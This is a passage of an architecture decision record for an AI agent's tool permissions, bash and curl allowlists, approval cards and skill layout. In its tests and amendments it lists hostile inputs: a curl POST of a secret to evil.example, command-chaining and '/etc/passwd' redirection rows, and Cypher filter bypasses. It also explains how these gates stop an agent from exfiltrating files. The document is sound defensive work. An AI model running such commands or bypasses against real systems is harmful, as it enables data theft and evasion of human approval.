- **AC-2 — the model chooses the right skill (G2).** **Check:** the T9 run over every `evals.yaml` scenario (at least 33) and 20 no-skill prompts, scored from `read_skill_invoked` events. At least 10 of the 20 no-skill prompts contain a word that today's `keywords` match.
  - A scenario counts as right only if the expected skill loads and no other skill loads.
  - A no-skill prompt counts as wrong if any skill loads.

  *Fails if* fewer than 33 scenarios run, fewer than 90% of scenarios are right, or more than 2 of the 20 no-skill prompts load a skill.
- **AC-3 — fixable calls fall (G3).** **Check:** the PR #1242 audit method re-run per D10. *Fails if* the fixable share is above 15% in either session.
- **AC-4 — the prompt does not grow (G4).** **Check:** the median first-call `prompt_tokens` per turn over the G3 runs, against the baseline recorded before the run. *Fails if* the median is above the baseline.
- **AC-5 — every "ask" reaches the user, and runs only on the user's yes.** **Check:** tests for the primary and for a worker.
  - With a PWA client, a call that matches no rule shows the card with the exact arguments. It runs on "allow once" and is refused on deny. *Fails if* the card is not shown, or the call runs before the answer.
  - In each case of D8.4 (`approval_ui_enabled=False`, no session id, no transport, a transport whose PWA client is gone), the same call is denied with a D6 error. *Fails if* it runs.
  - If the rules fail to load, or the evaluation raises, the call is denied. A tool with no rule asks. *Fails if* either runs without an ask.
  - After "allow for this session" on an unmatched call, the same call runs without a card.
  - A call that matches an explicit ask rule offers no "allow for this session". The test then adds a session rule that equals that call, and runs the call again: the card is still shown.

  *Fails if* any of these differs.

  Seeded negative: restoring row A3's branch makes the second test fail.
- **AC-6 — the bash matcher allows only plain commands.** **Check:** a table test under the allow rule `Bash(ls *)` only. The table has one row for each of:
  - each separator: `&&`, `||`, `;`, `|`, `|&`, `&`, newline, each followed by `rm x`;
  - each FRE-1572 form, and `rm x` inside a subshell, a command substitution, backticks, and an `if`, `for` and `while` body;
  - each failed condition of D8.2: an expansion in a word, a glob, a variable assignment (`PATH=/x ls`), an output redirection to a file, an input redirection from a file (`ls < /etc/passwd`), a function definition, a heredoc, both process substitutions, and `find . -exec`, `-execdir`, `-ok` and `-okdir` under an added allow rule `Bash(find *)`;
  - every listed indirect-execution word in front of `ls` (for example `env ls`, `timeout 5 ls`, `command ls`). These rows test the guard: a matcher that strips the wrapper and matches `ls` would allow them;
  - the rules loader, given `Bash(env *)`, `Bash(timeout *)` and `Bash(awk *)`, rejects each one;
  - one input that the parser cannot parse.

  Where the form permits it, a row starts with `ls`.

  *Fails if* any row is allowed. Control rows: `ls -la /tmp` is allowed, and `ls -la /tmp > /dev/null` is allowed. Seeded negative: a matcher that checks only the first word fails at least 10 rows.
- **AC-7 — the user's message selects no skill.** **Check:** a test assembles the primary's first-call messages twice with the same session state and two different user messages: one with no skill word, and one with every `keywords` entry of every skill today. T5 saves that list as test data before it deletes the field. *Fails if* the system part of the two prompts differs, or either holds a skill body. This covers every term, not a sample.
- **AC-8 — the model sees the fix, and telemetry sees the failure.** **Check:** the AC-1 tool and dispatch tests also assert, for each driven failure, that the tool message to the model holds the full `message` (up to 2,000 characters) and that `tool_call_completed` logs `success: false`. Named instance: a `query_telemetry` call with a field that is not allowed returns the list of allowed fields. *Fails if* any failure is clipped below its message length, or logs `success: true`.
- **AC-9 — the worker file grant is read-only and bounded.** **Check:** a `general` worker test with a task whose `read_paths` names one file. *Fails if* the worker cannot read that file, or if any of these succeeds:
  - a read of a file that the task does not name;
  - a write or an edit of the named file;
  - a read through `../` or a symlink that resolves to another file;
  - a read after the named file is replaced by a symlink to another file;
  - a read of a directory named in `read_paths`;
  - a read through a hard link to the named file at another path;
  - a read of the named file after the task ends;
  - a read after the named file is replaced by another regular file at the same path (a rename over it).
- **AC-10 — each worker type sees its own catalog.** **Check:** a test builds the first-call prompt and the tool list of each worker type. *Fails if* any of these holds:
  - a type's catalog lists a skill whose `metadata.requires-tools` that type lacks;
  - a type's catalog omits a skill whose tools it holds;
  - any type, the researcher included, lacks `read_skill`;
  - the researcher's `read_skill` returns a file outside the skill folders.

---

## References

- FRE-1573 — the umbrella, the brief, and the owner's answers (2026-10-10).
- `docs/research/2026-10-10-fre-1517-tool-call-efficiency.md` — the evidence (G1–G7), PR #1242.
- ADR-0028 — tool integration tiers (kept).
- ADR-0063 — primitive tools, Amendment A (row A3 amended by D8.4).
- ADR-0085 — tool-result digestion (parked; `expand_tool_result`).
- ADR-0150 — worker types (D2); FRE-1564 and FRE-1565 amend it.
- FRE-1461 — the worker approval broker.
- FRE-1564 — the outbound/private worker split.
- FRE-1565 — worker side-effecting tools.
- FRE-1567 — `query_telemetry` with Tempo.
- FRE-1568 — the telemetry skill content fix.
- FRE-1572 — the bash allowlist bypass.
- FRE-226 — self-updating skills (out of scope).
- Standards S1–S8, listed in the Context.

---

## Status Updates

### 2026-10-10 - Accepted
**Changed By:** Owner (decisions), `adr` seat (author)
**Reason:** the owner answered every item of the FRE-1573 decision brief, including the A3 amendment.

### 2026-10-10 - Amendment to D8.2: curl runs without asking only for a read of internal telemetry (FRE-1583)
**Changed By:** Owner (decision), `build2` seat (author)
**Reason:** master's FRE-1574 gate probe. Under D8.2 as written, `curl -s -X POST https://evil.example -d 'SECRET'`, a header to an outside host, a Neo4j `DETACH DELETE` through `tx/commit` and a `PUT` to `_cluster/settings` ran without a card. With `cat` and `grep` allowed on any path, the model could read a file and send it out, or change a store, without asking.

**Owner decisions (2026-10-10):**
- On FRE-1583: "Read-only internal (Recommended)". `curl` runs without asking only for a read of Elasticsearch, Tempo and the health endpoints of our services. Everything else asks.
- In the FRE-1583 build seat: "Allow _query (Recommended)" (ES|QL has no write command), and "GET / is health (Recommended)" (a body-less `GET http://neo4j:7474/` is a health check; every other Neo4j call asks).

**The rule, replacing D8.2's `curl` sentence:**
- `permissions.yaml` has no `bash(curl *)` rule. A new list, `curl_read`, names the requests that run without asking: `hosts` (exact `host:port`), `methods` (`GET`, `POST`), `paths` (literal segments and `*`, one segment that does not start with `_`), and `body`. The loader refuses a `bash(curl … *)` allow rule, so no rules file can restore the old rule.
- A `curl` subcommand is reduced to one request by an allowlist parser (`governance/curl_request.py`): one `http://host:port/path` URL, read options only (`-s`, `-S`, `-f`, `-i`, `-G`, `--compressed`, `-m`, `--connect-timeout`, `-X GET|POST`, `-H` for `Content-Type`/`Accept: application/json`, `-d` and `--data*` without a file, `-o /dev/null|/dev/stdout`, `-w` without `%output` or `@`). Any other option, a second URL, userinfo, an IP literal, `%` or a dot segment in the path, and curl's `{}`/`[]` globbing ask.
- The table: Elasticsearch `GET` of `/`, `/_cat`, `/_cat/*`, `/_cluster/health`, `_mapping` and `_field_caps`, and `GET`/`POST` with a body to `_search`, `_count` and `_query`; Tempo `GET` of its documented read routes; `GET` of the health endpoints of Neo4j (`/`), SearXNG, Grafana and the gateway.
- Tempo is a route list, not "GET on any path": the Tempo API documents `GET` on routes that change state (`/live-store/prepare-downscale`, `/api/overrides`).

**Accepted residual risks (Codex plan review):**
- curl reads a default config file (`~/.curlrc`) unless `-q` comes first. Requiring `-q` would make AC-2's plain forms ask. The gateway runs as root, `/root` is outside the `write` tool's `allowed_paths`, and every bash write to a file asks. So the model cannot plant the file without an approved call.
- A proxy environment variable redirects curl. No compose file sets one, and the model cannot set one without an approved call (an assignment and `export` ask).
- `_search?scroll=…` keeps a search context open until it expires. It changes no data.

### 2026-10-11 - Amendment to D8.2: reviewed skill scripts run without a card (FRE-1585)
**Changed By:** Owner (decision), `build` seat (author)
**Reason:** since FRE-1574, `python3` always asks. The skills converted in FRE-1578 ship tested, read-only scripts under `docs/skills/<skill>/scripts/`. Each call showed a card, although the scripts only read.

**Owner decision (2026-10-11, FRE-1585):** "yes" to an allow rule that names each exact skill script, reviewed like code, so that these read-only calls run without a card.

**The rule, added to D8.2:**
- One prefix form of a program-running word loads: `bash(python3 <path> *)`. The loader accepts it only when `<path>` is relative, matches `docs/skills/<skill>/scripts/<file>.py` with no dot segment and no glob, names a regular file in the directory where the bash tool starts (`/app` in the image), and passes through no symbolic link. Any other `python3 … *` rule is refused when the rules load. An exact `bash(python3 …)` rule stays as D8.2 had it.
- `validate_mermaid.py` reads only a `.mmd` file that is not a link, and gives `mmdc` the absolute path. `mmdc` echoes a parse error, so without this an argument could print a line of any file.
- The matcher is unchanged. The words of the rule must equal the first two words of the subcommand. So `./docs/…`, `/app/docs/…`, a dot segment, an interpreter option (`python3 -I …`) and `python` do not match. The rest of D8.2 applies to the whole command: a separator starts a subcommand that its own rule must allow, and an expansion, a glob, an assignment or a redirection to a file asks.
  - *2026-10-11, FRE-1589:* `read_skill` gives `base_dir` as `/app/docs/skills/<skill>`, so the model ran `python3 /app/docs/skills/…`, and the call asked. The matcher now also accepts the word `/app/<path>` for a skill-script rule, when the bash tool starts in `/app` (as in the image). The comparison is exact on the word after quote removal. `./docs/…`, `/app/./docs/…`, `/app//docs/…`, a dot segment and any other prefix still do not match. Outside `/app` (a `make dev` run), the `/app/` form asks, because there it names a different file.
- One allow rule per reviewed script, each with a reason, in `config/governance/permissions.yaml`. A script gets a rule only in the PR that reviews it. A test fails if a rule names a script that `tests/docs/test_skill_scripts.py` does not test for argument safety.
- The scripts in this change: `infrastructure-health/probe_services.py`, `neo4j-direct/cypher.py`, `query-elasticsearch/es_index_granularity.py`, `turn-forensics/call_timeline.py` (NORMAL, ALERT, DEGRADED), and `mermaid-diagrams/validate_mermaid.py` of FRE-1579 (NORMAL only, as `bash(mmdc *)`).
- `write` and `edit` refuse `/app/docs/skills/**` and `/app/.venv/**` through `forbidden_paths`. The durability check refuses these paths already, but it fails open when the mount table cannot be read.

**Found in the review, fixed in the same change:** `cypher.py` sent three kinds of query that a read transaction does not stop. Each was seen on the test Neo4j in read access mode: `apoc.cypher.runFirstColumnSingle` ran `dbms.listConfig()` from inside a string, `SHOW SETTINGS` returned the configuration, and `TERMINATE TRANSACTIONS` ran. The self-review and probes of the server's parser found two more ways past the function check: a `\u` escape in a name (`apoc.\u0063ypher` ran) and a range bound (`[0..apoc.cypher.x()]`). Before it connects, the script now refuses:
  - a backslash outside a string;
  - a function with a namespace that is not on an explicit list (allow, never deny, as for procedures; master's gate). The list holds the Cypher built-ins with a namespace and the APOC core namespaces that compute on their arguments or read the graph, read from `SHOW FUNCTIONS` on Neo4j 5.26. The match is exact and works in every quoting and spacing form. So `apoc.cypher.*`, `apoc.xml.*` and `apoc.util.*` are refused, and so is a function that a plugin change adds (`ai.text.*`, a newer APOC). A function without a namespace (`count`, `toLower`) is a built-in and is allowed;
  - an administration command (`SHOW`, `TERMINATE`, `ALTER`, `RENAME`, `GRANT`, `DENY`, `REVOKE`, `START`, `STOP`, `ENABLE`, `DEALLOCATE`, `REALLOCATE`) at the start of a statement, after `CYPHER` options and `EXPLAIN` or `PROFILE`, where the server accepts one. Elsewhere these words are names (a variable `start`);
  - `USE` anywhere, because it is valid in a subquery.

  A line comment ends at every line terminator, so a server that ends it sooner sees no text that the script did not read. The server refuses data writes in read access mode (`CREATE` and `INSERT` were refused on the test server).

**Accepted residual risks (Codex plan review):**
- The allowed file is trusted as code. It is in the image, not on a mounted volume, and `write` and `edit` refuse it. A bash write to a file asks. The loader checks the file when the rules load, and bash opens it by name later, so a change by a process outside the gateway between the two is not detected. Only a reviewed PR and a rebuild change the file.
- `probe_services.py` runs `psql` with a fixed argument list. The host, port, user and database come from the environment, not from an argument. The audit test sees the spawn but not what `psql` does inside.
- `cypher.py` sends model-written Cypher to Neo4j in a read transaction. It can read any node of the graph. That is its purpose.
- A command before the script in a pipeline is judged by its own rule. The scripts only filter and print their input.

### 2026-10-12 - Amendment to D1, D5, D7 and D9: skills named by objective in a top-level folder, and tools that their skill reveals (FRE-1591)
**Changed By:** Owner (decisions), `adr` seat (author), `master` (the location question and its research)
**Reason:** the telemetry skills and the tool are named after products (Elasticsearch, Tempo) or after the word "telemetry", and the tool and the skills cover the same tasks. The owner, on FRE-1591: "They specify a product - not an objective. Only "telemetry" - this is a word game and we have muddied the water." A second owner question, relayed by master on 2026-10-12: "why are skills stored in docs/? They should have their own top level directory."

#### The evidence

- **The tool takes the skill's work.** FRE-1590 Part 1 (24 tools, 10 skills): `query-elasticsearch` loaded on 2 of 12 draws on Flash-Next and 1 of 12 on Gemma. On every miss, the first call was `query_telemetry`. Scenarios #0–#2 of that skill are tasks that the tool does alone, so the model's choice was right and the scorer counted it as a miss. `query-tempo` #0 (latency over a window) is the same case. Source: `docs/research/2026-10-12-fre-1590-skill-test-qwen-gemma.md`, F1 and F2.
- **The model mixes up the tool and the skills.** The only unknown-skill request in production (`missing_skill_requested`, 2026-10-10 12:17:56Z) asked for a skill named `query-telemetry`, which is the tool's name. Captain's Log reflections invent `telemetry-analyzer` (7 times), `logs-analyzer` (3) and `telemetry-validator`.
- **The tool description is in every request.** It has 3,472 characters, about 870 tokens at the repository's estimate of 4 characters per token. One catalog line costs 50–100 tokens (S2).
- **Production use is small.** Since the D2 loader went live on 2026-10-10, production loaded skills 6 times (`read_skill_invoked`: `infrastructure-health` 2, `query-elasticsearch` 2, `self-telemetry` 2). It called `query_telemetry` 116 times in 6 traces (`tool_call_started`, 2026-10-10 to 2026-10-12).
- **The workers hold the tool, not `bash`.** The `general` worker holds `query_telemetry` (FRE-1564, owner, "1 a"), and neither worker type holds `bash` (`orchestrator/worker_types.py:317-332`). Workers see no skill that needs `bash` (D9.1).

#### Added standards

- **S9 — Anthropic, "Skills explained":** https://claude.com/resources/articles/skills-explained (accessed 2026-10-12). "MCP connects Claude to data; Skills teach Claude what to do with that data."
- **S10 — Claude Code subagents:** https://code.claude.com/docs/en/sub-agents (accessed 2026-10-12).
- **S11 — the `anthropics/skills` repository:** https://github.com/anthropics/skills (listed with the GitHub API on 2026-10-12). It holds its skills in a top-level `skills/` folder.
- **S12 — Anthropic tool search tool:** https://platform.claude.com/docs/agents-and-tools/tool-use/tool-search-tool and https://www.anthropic.com/engineering/advanced-tool-use (accessed 2026-10-12). A tool marked `defer_loading: true` is left out of the rendered tools, and its definition is expanded inline in the conversation when it is found, so the cached prefix is kept. This is an Anthropic API feature. A provider that takes tools only as the list at the start of the prompt has no such form (pydantic-ai issue 3590).

#### Owner decisions (2026-10-12, this seat)

1. The runtime skills move to a top-level `skills/` folder, in a ticket of its own that goes first: "Follow your recommendations", and "yes" to 3 and 4.
2. A top-level `agents/` folder is reserved for worker definitions. Nothing moves now.
3. Each name states an objective. `neo4j-direct` is renamed too: "rename approved".
4. The telemetry tools stay native. The primary sees a tool only after it loads a skill that provides the tool (W4 below). The `general` worker keeps the tools. A measurement ticket goes first, and W3 is the written fallback: "yes".

#### A1 — Where skills live (amends D1.1)

1. The agent's runtime skills are folders under a top-level `skills/<name>/`. `docs/skills/` no longer holds a skill.
2. **Why.**
   - The standard does not fix a location. S2: "the Agent Skills specification does not mandate where skill directories live (it only defines what goes inside them)". For an agent in a container, S2 says: "Built-in skills can be packaged as static assets within the agent's deployment artifact". That is our case: `Dockerfile.gateway:71` copies the skills into the image.
   - A skill is runtime input that holds reviewed code. The permission rules name its script paths (`governance/permissions.py:100`), and `write` and `edit` refuse its folder (`config/governance/tools.yaml:339`). A folder named `docs/` hides that a change in it is a code change.
   - S11 keeps its skills in a top-level `skills/` folder.
   - No coding agent scans a top-level `skills/` folder. Claude Code reads `.claude/skills/` and the `skills/` folder of an installed plugin. This repository is not a plugin.
3. **Every path moves in one change.** These change together, with their tests, in one PR:
   - the security paths:
     - `SKILLS_DIR` (`orchestrator/skills.py:30`);
     - the skill-script path pattern (`governance/permissions.py:100`) and the `/app/<path>` form of FRE-1589;
     - every skill-script rule (`config/governance/permissions.yaml:137-157`);
     - the forbidden path (`config/governance/tools.yaml:339`), which becomes `/app/skills/**`;
     - `Dockerfile.gateway:71`;
     - the `base_dir` that `read_skill` returns;
   - the stale-image guard, which hashes the skills folder as a build input (`scripts/eval/gateway_freshness.py:32-38`), and its fixtures (`tests/scripts/test_gateway_freshness_fingerprint.py`);
   - the eval loaders and mounts: `scripts/render_prompt_corpus.py`, `scripts/eval/fre1581/g2_skill_choice.py`, `scripts/eval/fre1590/help.py` and `docker-compose.fre1590.yml`;
   - the Captain's Log reflection prompt, which tells the model where skills live (`captains_log/reflection_dspy.py:174-178`);
   - every test that reads the skills folder. A test that scans an empty old folder passes without checking anything, so each one moves in the same PR.
4. **Only history keeps the old path.** ADRs before this amendment, research notes and plans record what was true at the time, so they keep it. Live documents change: READMEs, help text, `AGENTS.md` files, code comments and test docstrings.
5. `docs/external-skills/` stays. Seshat does not load those skills. They are documentation for other agents.

#### A2 — Where worker definitions will live (reservation, amends D9)

1. A worker type, when it gets a file, gets a top-level `agents/<name>.md` file in the S10 format:
   - the frontmatter holds `name`, `description`, `tools`, `model` and `skills`;
   - the body is the worker's prompt block.
2. The governance keeps its authority. When the gateway loads an agent file, it refuses any tool that `sub_agent_tools` (`config/governance/tools.yaml`) does not grant to that type.
3. **Nothing moves now.** The worker types stay in `orchestrator/worker_types.py` until a new worker type is created.
4. `.claude/agents/` stays for the dev-seat subagents (`linear-gate`, `spec-compliance-reviewer`).

#### A3 — Names state an objective (amends D5)

1. A skill name or a tool name states what the user wants to find out or do.
   - It may name the thing that the user works with, as S3's own examples do (`processing-pdfs`). So `mermaid-diagrams` stays.
   - It never names the backend that stores the data: `elasticsearch`, `es`, `tempo`, `neo4j`, `postgres`, `redis`. It never uses the word `telemetry`.
   - Skills use the noun-phrase form, which S3 accepts. The catalog already uses it (`system-metrics`).
2. Each description has a "Not for…" line that names the neighbouring skill or tool by its exact name.
3. The D1 validator enforces both rules, with a seeded failing case for each.

#### A4 — The skills of the telemetry area, and `graph-inspection` (amends D5)

| New skill | Objective | Was | Tool that it reveals (A5) |
|---|---|---|---|
| `log-search` | Count, break down or find log events over a window. Which indices and fields exist, and searches past the tool's limits (more than 50 hits, more than 30 days, ES\|QL) | `query-elasticsearch` | `search_logs` |
| `model-latency` | How slow the model calls are over a window, by role or model, and the prefill and decode time of the local server | `query-tempo` Step 1 | `measure_model_latency` |
| `turn-explanation` | What one turn did, and why it was slow or large: the call timeline, the spans of one trace, the browser events, the inference-server log | `turn-forensics`, `query-tempo` Steps 2–3 | `search_logs` |
| `spend-and-tokens` | Spend, token totals, prompt-cache hit rate and budget use | `self-telemetry` Patterns 1–3, 5 | `search_logs` |
| `interaction-outcomes` | How recent interactions ended, and the Captain's Log reflections and insights | `self-telemetry` Pattern 4 | — |
| `service-health` | Whether a service or a pipeline is healthy: Postgres, Elasticsearch, Neo4j, Redis, Tempo status, and the monitor indices | `infrastructure-health`, `query-tempo` status | `search_logs` |
| `graph-inspection` | The structure and exact facts of the knowledge graph: counts, labels, schema, creation and last-seen times | `neo4j-direct` | — |

1. The names `query-elasticsearch`, `query-tempo`, `self-telemetry`, `turn-forensics`, `infrastructure-health` and `neo4j-direct` leave the catalog.
2. **Two "Not for…" lines, as examples:**
   - `turn-explanation`: "Not for latency over a time window. The `model-latency` skill gives that."
   - `graph-inspection`: "Not for what the system knows about a topic. `search_memory` gives that."
3. **Each skill's scenarios test what only the skill knows** (S3: "Build evaluations first"). The scenarios of `query-elasticsearch` #0–#2 test tasks that the tool does alone, so they are rewritten.
4. **The FRE-1590 text defects are fixed in the same rewrite:**
   - `turn-explanation` says that `turn_status.context_tokens` is not a queryable field, and starts with the `input_tokens` ladder.
   - `spend-and-tokens` gives the cache hit rate for each provider: `cached / input` where the input includes the cached tokens (llama.cpp), and `cached / (input + cached)` where it does not.
   - `graph-inspection` names the facts that only Cypher reads.
   - `service-health` scenario #2 needs the probe script.

#### A5 — A tool that its skill reveals (W4; amends D7.2 and D7.4)

1. **`query_telemetry` splits by objective** into `search_logs` (the `search` and `count` actions) and `measure_model_latency` (the `latency` action). The code already holds two separate argument sets under one `action` switch (`_ES_ONLY_ARGS` and `_TEMPO_ONLY_ARGS`, `tools/telemetry_query.py:295-296`). The allowlists, the bounds and the D6 error codes do not change.
2. **The governance rows split with the tool.** Each new tool gets:
   - its own row in `config/governance/tools.yaml`, with the modes, timeout and rate limit of the `query_telemetry` row (`tools.yaml:1286-1293`);
   - its own allow rule in `config/governance/permissions.yaml`, as `query_telemetry` has (`permissions.yaml:78`);
   - its own `sub_agent_tools` entry. The FRE-1564 grant carries over to both, because the capability is the same.

   Grounding keeps both tools non-citable, as it keeps `query_telemetry` (`tests/personal_agent/grounding/test_source_registry.py:275`). A test asserts this for each new tool.
3. **A skill names the tools that it reveals** in `metadata.provides-tools`, a comma-separated list. S1 allows `metadata` as a map of strings. A skill-provided tool is marked as such in its `ToolDefinition`.
4. **The reveal lasts for the session, and only the server writes its record.**
   - The record is a new column `sessions.revealed_tools` (`TEXT[] NOT NULL DEFAULT '{}'`). It is not a key in `sessions.metadata`: a client can replace that column through `SessionUpdate.metadata` and the PATCH endpoint (`service/models.py:70-73`, `service/app.py:2102-2112`, `service/repositories/session_repository.py:117-138`). It is not `ExecutionContext.loaded_skills` either, which holds one turn only (`orchestrator/types.py:570-575`).
   - `SessionUpdate` has no field for the column, and the PATCH endpoint cannot set or clear it.
   - The repository gets two methods. `add_revealed_tools(session_id, user_id, names)` adds names as a set union in one `UPDATE` statement, so two concurrent reveals both persist. `load_revealed_tools(session_id, user_id)` reads the set. Both filter on `session_id` and `user_id`, as the other user-facing session queries do (`service/repositories/session_repository.py:83-138`).
   - **A failed write keeps the reveal for the turn only.** If the `UPDATE` matches no row or raises, the tool stays revealed in the current `ExecutionContext`, a log event names the failure, and the next turn reads the record as it is.
   - **Retention.** Deleting a session deletes the record with the row. Pruning a session (`session_repository.py:210-239`) clears `revealed_tools` together with the messages, because the skill context that revealed the tools is gone.
   - **The seam:** `step_init` loads the set through the repository into a new `ExecutionContext.revealed_tools` field. The service does not pass session state to the orchestrator today (`service/app.py:506-519`, `orchestrator/orchestrator.py:118-133`), so the load happens in the executor, as other repository reads do (`orchestrator/executor.py:485-601`).
   - **A load error fails closed.** The set is empty for that turn, and a log event names the error. A skill loaded in that turn still reveals its tools for that turn.
   - **A turn reads the record once,** at `step_init`. A reveal in another turn of the same session that runs at the same time becomes visible at this session's next turn.
   - So the reveal survives a new user turn, a mid-turn compaction, a pause and resume, and a gateway restart.
   - A name in the record that is no longer a skill-provided tool, for example after a rename, is ignored when the record is read, with a log event.
   - The column is a schema change: `docker/postgres/init.sql`, the next contiguous file number in `docker/postgres/migrations/` (0033 today), and `SessionModel.revealed_tools` (`service/models.py:204-236`), with the parity and idempotency tests that the other migrations have. It runs as the `agent` superuser through `AGENT_DATABASE_ADMIN_URL`. Its deploy class is a Postgres migration.
   - Workers do not read the record. The `general` worker holds both tools in its closed tool list (`orchestrator/worker_types.py:317-332`), as it holds `query_telemetry` today.
5. **The order of the checks for a call to a skill-provided tool:**
   1. the tool exists in the registry, and its arguments parse;
   2. the principal holds it: the primary only after the reveal, a worker from its tool list;
   3. the current mode allows it. This is checked on every round, so a recorded reveal never overrides a later mode change;
   4. the tool loop gate;
   5. the D8 rules and the approval card;
   6. execution.

   A call that fails step 2 is refused with a D6 error. The error lists every skill that provides the tool (`search_logs` has four). It creates no approval card and does not count in the loop gate. A call in the same model response as the `read_skill` that reveals it is refused the same way, so a parallel sibling call never depends on the order of execution. The model calls the tool in a later round.
6. **The refusal in step 2 is a defence, not the normal path.** Before the reveal, the tool is not advertised, so a conforming model has no way to call it. The refusal stops a call that the model invents, that an injected text asks for, or that copies a schema it saw in an earlier result. The normal path is to load a skill from the catalog.
7. **Why W4.**
   - One implementation, one D6 contract and one security boundary. The primary keeps typed arguments.
   - The primary has one way in for each objective, so the overlap that gave 2 of 12 cannot happen.
   - The tool definitions leave every request that does not need them.
   - D7.2's evidence holds: no hand-written curl recipe comes back.
8. **Which form of the reveal.** Tools render first in the prompt. So adding a tool to the `tools` array discards the cached prompt. Measured on 2026-09-10: when the tools changed, 1,832 tokens were prefilled again in 4.59 s instead of 0.64 s. T-B chooses between two forms, for each provider dialect, as ADR-0149 D6 does for `tool_choice`:
   - **The cache-safe form (preferred):** the `tools` array does not change. The schema of a revealed tool reaches the model in the conversation:
     - in the reveal turn, in the successful `read_skill` result. That turn's `<turn_context>` block is already built, because the block is built once per user turn (`orchestrator/types.py:578-583`, `orchestrator/executor.py:6996-7036`);
     - in each later turn of the session, once, in that turn's `<turn_context>` block, which comes after the cached prefix (`orchestrator/executor.py:6968-7036`).

     The session history holds the raw user text, not the block (`service/app.py:421-428`). So the schemas of earlier turns do not pile up in the history. The cost is the schema tokens of the revealed tools in each later turn. This is the pattern of S12. It is not known whether llama.cpp turns a call to a tool that is not in the request's `tools` array into a tool call, or accepts the next request, whose transcript holds a call and a result for that tool. T-B measures both.
   - **The simple form:** the tool is added to the `tools` array at the reveal and stays for the session. The cost is one full re-prefill for each reveal, once per session.
9. **The fallback is W3.** If T-B shows that the full tool loop fails in both forms on the production primary (AC-F2), W3 applies:
   - the primary uses skill scripts;
   - the `general` worker keeps the typed tools;
   - the Codex conditions in the alternatives below become W3's acceptance criteria.
10. **Other code that names `query_telemetry` changes with the split.** T-C2 updates each of these, or records why one stays:
    - the `query_telemetry_*` log events (`tools/telemetry_query.py`);
    - the FRE-1517 audit buckets and call extraction (`scripts/eval/fre1517/tool_audit/buckets.py:54`, `calls.py:79`);
    - the failure-coverage scanner (`scripts/check_tool_failure_coverage.py:8`);
    - the help text in the settings, the tests of the Captain's Log and the route trace.

    Dashboards that group by `tool_name` show the old and the new names as separate series. They are not aliased: the old name is history.

#### Alternatives considered for this amendment

- **Keep `query_telemetry` visible, and give no skill to a task that the tool does alone.** This was the first brief on FRE-1591. Rejected: the primary keeps two ways in for one objective, and every request keeps paying for the tool definition.
- **W1 — remove the tool, and workers lose telemetry.** Rejected: it reverses the FRE-1564 owner grant.
- **W2 — give the `general` worker `bash`, limited to the reviewed scripts.** Rejected, from the Codex review of 2026-10-12:
  - Permission rules do not depend on the principal. `worker` is shown on the card but is not used to select a rule (`tools/executor.py:395`).
  - So a grant of `bash` gives the worker every global allow: `cat`, `grep`, `docker logs` (`config/governance/permissions.yaml:95-161`) and raw `_search`, `_count` and `_query` reads (`permissions.yaml:179-182`). Those reads bypass the tool's field allowlist and its exclusion of conversation text.
  - A skill-script rule is exact only in its first two words. The trailing `*` allows any literal arguments (`governance/permissions.py:264`, `503`).
- **W3 — the primary runs the telemetry code as skill scripts, and the worker keeps the tool.** This was the seat's recommendation before the Codex review. Rejected as the first choice, kept as the fallback (A5.9). Its conditions, from Codex:
  - a shared core that holds the allowlists, the validators, the request builders, the result shaping, the bounds and the error codes, not only the validators;
  - scripts that take structured values and no path, URL, subprocess or raw request body;
  - tests that prove the tool and the script give the same results;
  - a test in the built image that runs each script as `nobody`.

  Also, `telemetry_query.py` imports the settings singleton when it is imported (`tools/telemetry_query.py:45`, `config/__init__.py:22`), so a script must not import it directly.
- **A reveal for one turn only,** as `loaded_skills` works today. Rejected: in the simple form, the `tools` array changes at every turn that reveals a tool and at the next turn that does not, and each change discards the cache.
- **Other locations for the skills (A1).** Rejected:
  - Keep `docs/skills/`: the name hides code that the permission model governs. D1 kept this path without a reason, and the reason was history (ADR-0028 phase 4).
  - `config/skills/`: `config/` holds the settings of each deployment. Skills are reviewed and released with the code.
  - `.agents/skills/`: Codex, Cursor, Copilot and Goose scan it. So they load the runtime skills into coding sessions on this repository.
  - `.claude/skills/`: it holds the dev-seat skills. A shared folder makes every seat load the runtime catalog.
  - `src/personal_agent/skills/`: the model reads skills and does not import them. Under `src/`, the adr and explore seats can no longer edit skills.

#### Verification / Acceptance Criteria of this amendment

**Two kinds.** AC-L and AC-N are structural: they prove that a rule is enforced, not that the routing is good. AC-R proves the reveal behaviour. AC-F measures the model and the prompt, and its runs start only after the owner's OK on the preflight numbers. Master checks AC-L, AC-N and AC-R from the PRs.

**Pinning for every AC-F run.** The run records:
- the hash of each captured request;
- the model, the quant, the llama.cpp build and the chat-template hash, or the cloud deployment;
- the sampling settings;
- the scenario ids and the hash of each scenario text;
- the draws for each scenario;
- the cache warm-up procedure.

AC-F results are fresh A/B results. They are not compared with the FRE-1590 numbers, because the scenarios are rewritten.

- **AC-L1 — the same skills load from the new folder.** The list of skill names and file hashes under `/app/skills/` in the built image equals the list under `/app/docs/skills/` in the image before the move. *Fails if* one name or one hash differs. (T-A)
- **AC-L2 — the security paths and the stale-image guard moved with the skills.** Tests show each of these. *Fails if* any one does not hold. (T-A)
  - A skill-script rule that names `docs/skills/<s>/scripts/<f>.py` is refused when the rules load.
  - A `write` and an `edit` to `/app/skills/<s>/SKILL.md` are refused.
  - `python3 /app/skills/<s>/scripts/<f>.py` matches its rule only when the bash tool starts in `/app`.
  - A change to a file under `skills/` changes the gateway freshness fingerprint (`scripts/eval/gateway_freshness.py:32-38`).
  - A CI check fails if `docs/skills` appears in `src/`, `config/`, `scripts/`, `tests/`, `skills/`, `.env.example`, a `Dockerfile*`, a `docker-compose*` file, or any file under `docs/` other than `docs/architecture_decisions/`, `docs/research/` and `docs/superpowers/plans/`. Each exception outside those three folders is listed by exact file name, for example a seeded refusal fixture. A seeded file outside the list makes the check fail. Today this scope finds, among others, `.env.example:855`, `docs/guides/TELEMETRY_ELASTICSEARCH_INTEGRATION.md:187`, `docs/specs/PROMPT_MANAGEMENT_SPEC.md:43` and `docs/reference/TOOL_INTEGRATION_GUIDE.md:240-251`.
- **AC-N1 — no backend word in a name.** The validator splits each skill name and each tool name on `-` and `_`. It fails if a part equals `elasticsearch`, `es`, `tempo`, `neo4j`, `postgres`, `redis` or `telemetry`. *Fails if* the seeded names `query-elasticsearch` and `query_telemetry` pass, or a real name fails. This proves the lexical rule only. The owner approved the names themselves on FRE-1591. (T-C2)
